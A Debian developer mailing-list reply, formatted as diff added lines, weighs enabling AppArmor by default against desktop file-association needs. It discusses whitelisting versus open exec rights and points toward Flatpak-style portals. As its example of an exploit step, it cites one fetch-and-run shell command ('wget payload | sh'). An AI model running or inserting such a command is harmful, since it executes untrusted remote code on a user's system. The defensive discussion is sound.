@@ -1,0 +1,69 @@
+To : Philipp Kern <phil@philkern.de>, Carsten Schoenert <c.schoenert@t-online.de>, debian-devel@lists.debian.org
+Subject : Re: Let's enable AppArmor by default (why not?)
+From : Christian Seiler <christian@iwakd.de>
+Date : Tue, 31 Oct 2017 18:56:59 +0100
+Message-id : 5d6d0cfa-d739-759c-a536-8be883920cb0@iwakd.de
+In-reply-to : <[🔎] 23473de1-4b90-80eb-9e1f-2485aa9db1a8@philkern.de>
+References : <857eyij4fb.fsf@boum.org> <[🔎] fbb325ce-c21a-84f8-bece-d3e1696b66c7@debian.org> <[🔎] ff7330ca-d813-5497-84fb-dff0e709bd32@t-online.de> <[🔎] 23473de1-4b90-80eb-9e1f-2485aa9db1a8@philkern.de>
+
+
+Hi there,
+On 10/31/2017 01:46 PM, Philipp Kern wrote:
+>>> [2] e.g.
+>>> [ 3795.153239] audit: type=1400 audit(1509283418.100:64):
+>>> apparmor="DENIED" operation="exec" profile="thunderbird"
+>>> name="/opt/google/chrome-beta/google-chrome-beta" pid=31896
+>>> comm="thunderbird" requested_mask="x" denied_mask="x" fsuid=1000 ouid=0
+> 
+> Filed as #880424[0]. I think there is a deeper question here as to how
+> to handle the browser abstraction for AppArmor in general.
+Isn't this a really generic problem for any AppArmor/SELinux-like LSM?
+Because this isn't just restricted to links, this is restricted to any
+kind of file association (links are handled like file associations with
+the MIME type x-scheme-handler/$PROTOCOL in the XDG specs).
+Because in the end you have the following conflicting requirements:
+ - On the one hand, you want the user to be able to open arbitrary
+   files and links from many programs (especially e.g. email programs),
+   for example opening PDF attachments with your favorite PDF reader
+   or external links in your browser.
+   This means that the email program must be able to execute arbitrary
+   executables, because the user may have assigned arbitrary
+   executables (for example also wrapper scripts in their home
+   directory) to different file associations.
+ - The user might also want to open a specific file with another
+   program that is also associated with the file but not the default.
+   For example, JPEG attachments might most commonly be opened by
+   the favorite image viewer, but sometimes users may want to open
+   the JPEG file in an image editor such as GIMP, and many programs
+   offer the user a choice to choose between the installed programs
+   that are associated with the type.
+ - On the other hand one of the key features of AppArmor is to mitigate
+   exploits so that an attacker can't just get the program to call the
+   syscall execve("/bin/sh", {"/bin/sh", "-c", "wget payload | sh"});
+I think this is a more general problem. It appears to me that there are
+currently two possibilities:
+ - Either one allows the execution of arbitrary executables by all
+   desktop applications (because we don't know in advance what file
+   types will be associated with what program, and the user may have
+   their own wrapper scripts) - but that leaves a gaping hole in the
+   possible mitigations AppArmor may provide.
+ - Or one whitelists certain applications. This will have the
+   unfortunate side-effect that any time the user installs a piece of
+   software that isn't on that whitelist (or wants to use their own
+   wrapper script) it won't work (because of AppArmor) - and
+   unfortunately many users will then simply resort to disabling
+   AppArmor in that case instead of actually creating a locally
+   adapted policy. (Yes, sysadmins might not, but simple desktop
+   users will - I know way too many people who simply don't even want
+   to use group ownership and instead are happy to just do a
+   chmod 0777 - and groups are mentally a lot simpler than AppArmor.)
+I don't know what the best short-term compromise is here, but in the
+long term the only real solution is to somehow abstract this away from
+applications to ensure that the application started in these cases is
+actually what the user wanted. (I'm thinking towards something like
+the 'portals' concept in Flatpak.) Because if the default policy does
+not cover these kinds of customization needs out of the box at least a
+lot of desktop users will simply revert AppArmor and complain about
+it.
+Regards,
+Christian
